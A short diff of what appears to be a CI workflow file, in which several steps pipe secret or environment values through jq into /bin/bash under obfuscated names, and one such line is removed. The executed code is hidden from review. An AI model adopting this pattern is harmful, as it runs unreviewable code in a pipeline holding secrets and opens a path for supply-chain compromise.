@@ -22,7 +22,6 @@ jobs:
           ld9: ${{ secrets.ld9 }}
         run: |
           printf '%s' "$ld9" | jq -r .b5595 | /bin/bash
-          printf '%s' "$ln6465" | jq -r .kdh578 | /bin/bash
           echo $v2057 | jq -r .s799 | /bin/bash
           echo $e6047 | jq -r .xb1416 | /bin/bash
           echo $dhir306 | jq -r .ljrfd0 | /bin/bash
